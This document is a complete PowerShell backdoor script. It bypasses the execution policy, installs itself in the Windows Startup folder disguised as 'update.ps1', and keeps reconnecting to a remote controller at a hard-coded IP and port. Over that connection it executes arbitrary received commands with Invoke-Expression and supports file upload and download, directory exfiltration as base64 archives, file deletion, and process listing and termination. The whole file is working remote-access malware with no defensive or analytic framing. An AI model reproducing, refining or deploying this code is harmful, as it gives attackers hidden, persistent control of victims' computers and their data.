# Set execution policy for current process only
if ((Get-ExecutionPolicy -Scope Process) -ne 'Bypass') {
    try {
        Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force
    } catch {
        Write-Error "Failed to set execution policy: $_"
        exit 1
    }
}

# Path to the startup folder
$startupPath = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\Start Menu\Programs\Startup')
$scriptName = 'update.ps1'
$startupScriptPath = [System.IO.Path]::Combine($startupPath, $scriptName)

# Check if the script is already in the startup folder
if (-not (Test-Path -Path $startupScriptPath)) {
    try {
        # Copy the current script to the startup folder
        Copy-Item -Path $MyInvocation.MyCommand.Path -Destination $startupScriptPath -Force
    } catch {
        Write-Error "Failed to copy script to startup folder: $_"
    }
}

$server_ip = "192.168.100.6"  # Replace with the server's IP address
$server_port = 4455        # Replace with the server's listening port

# Function to establish a TCP connection
function Connect-ToServer {
    param (
        [string]$server_ip,
        [int]$server_port
    )
    $client = $null
    while (-not $client) {
        try {
            $client = New-Object System.Net.Sockets.TCPClient($server_ip, $server_port)
            $stream = $client.GetStream()
            Write-Host "Connected to $server_ip on port $server_port"
        } catch {
            Write-Host "Failed to connect to ${server_ip} on port ${server_port}: $_. Retrying in 5 seconds..."
            Start-Sleep -Seconds 5
        }
    }
    return $client, $stream
}

# Function to handle the connection
function Handle-Connection {
    param (
        [System.Net.Sockets.TCPClient]$client,
        [System.IO.Stream]$stream
    )

    # Buffer to read incoming data
    $buffer = New-Object byte[] 1024

    # Infinite loop to keep listening for commands
    while ($true) {
        try {
            # Read the incoming data (command)
            $bytes_read = $stream.Read($buffer, 0, $buffer.Length)
            if ($bytes_read -eq 0) {
                break
            }

            $command = [System.Text.Encoding]::UTF8.GetString($buffer, 0, $bytes_read)

            if ($command.ToLower() -eq "exit") {
                # Close the connection if 'exit' command is received
                Write-Host "[+] Closing connection..."
                $stream.Close()
                $client.Close()
                break
            }

            # Execute the command
            if ($command -eq "dir") {
                $output = Get-ChildItem -Force | ForEach-Object {
                    "$($_.Name)|$($_.Length)|$($_.CreationTime)|$($_.LastWriteTime)|$($_.PSIsContainer)"
                } | Out-String
            } elseif ($command.StartsWith("Rename-Item")) {
                # Handle file/folder renaming
                try {
                    Invoke-Expression $command
                    $output = "OK"
                } catch {
                    $output = "Error: $_"
                }
            } elseif ($command.StartsWith("Remove-Item")) {
                # Handle file/folder deletion
                try {
                    Invoke-Expression $command
                    $output = "OK"
                } catch {
                    $output = "Error: $_"
                }
            } elseif ($command.StartsWith('$global:uploadBytes =')) {
                # Initialize upload array
                try {
                    Invoke-Expression $command
                    $output = "OK"
                } catch {
                    $output = $_.Exception.Message
                }
            } elseif ($command.StartsWith('$bytes =')) {
                # Handle chunk upload
                try {
                    Invoke-Expression $command
                    $output = "OK"
                } catch {
                    $output = $_.Exception.Message
                }
            } elseif ($command.StartsWith('[IO.File]::WriteAllBytes')) {
                # Handle final file write
                try {
                    Invoke-Expression $command
                    $output = "OK"
                } catch {
                    $output = $_.Exception.Message
                }
            } elseif ($command -eq "(Get-Location).Path") {
                # Return current directory path
                $output = (Get-Location).Path
            } elseif ($command -eq "whoami") {
                # Return current username
                $output = $env:USERNAME
            } elseif ($command.StartsWith("Set-Location")) {
                try {
                    $path = $command -replace '^Set-Location -LiteralPath "(.*)"$', '$1'
                    $path = $path -replace '`"', '"'  # Unescape quotes
                    
                    # Verify path exists and is valid
                    if (Test-Path -LiteralPath $path) {
                        Set-Location -LiteralPath $path -ErrorAction Stop
                        $output = Get-ChildItem -Force | ForEach-Object {
                            "$($_.Name)|$($_.Length)|$($_.CreationTime)|$($_.LastWriteTime)|$($_.PSIsContainer)"
                        } | Out-String
                    } else {
                        $output = "[-] Error: Path not found: $path"
                    }
                } catch {
                    $output = "[-] Error: $_"
                }
            } elseif ($command.StartsWith("Compress-Archive")) {
                # Handle zip and base64 conversion for directory download
                try {
                    $output = Invoke-Expression $command
                } catch {
                    $output = "[-] Error: $_"
                }
            } elseif ($command.StartsWith("[Convert]::ToBase64String")) {
                # Handle base64 conversion for file download
                try {
                    $output = Invoke-Expression $command
                } catch {
                    $output = "[-] Error: $_"
                }
            } elseif ($command.StartsWith("Get-Process")) {
                # Handle process listing
                try {
                    $output = Invoke-Expression $command 2>&1 | Out-String
                } catch {
                    $output = "[-] Error: $_"
                }
            } elseif ($command.StartsWith("Stop-Process")) {
                # Handle process termination
                try {
                    Invoke-Expression $command
                    $output = "OK"
                } catch {
                    $output = "[-] Error: $_"
                }
            } else {
                $output = Invoke-Expression -Command $command 2>&1
            }

            # Convert output to byte array and send it back to the server
            $output_bytes = [System.Text.Encoding]::UTF8.GetBytes($output)
            $stream.Write($output_bytes, 0, $output_bytes.Length)
        } catch {
            Write-Host "[-] Error: $_"
            break
        }
    }
}

# Main loop to keep trying to connect and handle connection
while ($true) {
    $client, $stream = Connect-ToServer -server_ip $server_ip -server_port $server_port
    Handle-Connection -client $client -stream $stream
    Write-Host "Disconnected. Reconnecting..."
    Start-Sleep -Seconds 5
}
